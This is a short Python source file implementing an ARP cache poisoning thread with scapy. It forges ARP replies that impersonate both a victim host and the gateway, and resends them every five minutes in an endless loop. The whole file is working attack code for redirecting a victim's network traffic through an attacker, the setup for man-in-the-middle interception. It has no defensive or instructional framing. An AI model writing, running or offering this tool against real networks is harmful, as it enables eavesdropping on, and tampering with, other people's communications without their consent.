import time

import scapy.all as scapy
from threading import Thread

from src.service.log import Log

log = Log()


class Poison(Thread):

    def __init__(
            self, victim_ip: str,
            gateway_ip: str, attack_mac: str
    ):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attack_mac = attack_mac
        Thread.__init__(self)

    def run(self):
        gateway_is_at = scapy.ARP(
            op=2, psrc=self.gateway_ip,
            pdst=self.victim_ip, hwdst=self.attack_mac
        )
        victim_is_at = scapy.ARP(
            op=2, psrc=self.victim_ip,
            pdst=self.gateway_ip, hwdst=self.attack_mac
        )

        while True:
            log.info('Sending poison on ARP Table...')

            log.info(f'{gateway_is_at}')
            log.info(f'{victim_is_at}')

            scapy.send(gateway_is_at, verbose=0)
            scapy.send(victim_is_at, verbose=0)
            time.sleep(300)
